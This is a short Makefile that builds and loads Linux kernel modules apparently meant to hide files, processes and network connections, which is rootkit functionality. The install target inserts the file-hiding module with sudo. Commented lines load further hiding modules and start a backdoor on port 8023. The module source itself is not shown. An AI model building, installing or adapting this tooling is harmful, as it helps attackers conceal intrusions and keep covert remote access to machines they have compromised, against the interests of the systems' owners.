LS = hidels
#PS = hideps
#NETSTAT = hidens
#MOD = hidemod

KDIR =/usr/src/linux-headers-$(shell uname -r)

PWD := $(shell pwd)

obj-m +=$(LS).o
#obj-m +=$(PS).o
#obj-m +=$(NETSTAT).o


default: 
	make -C $(KDIR) M=$(PWD) modules


clean: 
	rm -rf *.o *.ko Module.symvers modules.order *.mod.c *.mod.o

install: 
	sudo insmod $(LS).ko
#	sudo insmod $(PS).ko
#	sudo insmod $(NETSTAT).ko
#	./Backdoor 8023
	

lsmod: 
	sudo lsmod|grep $(LS) #$(PS) $(NETSTAT)

uninstall: 
	sudo rmmod $(LS)
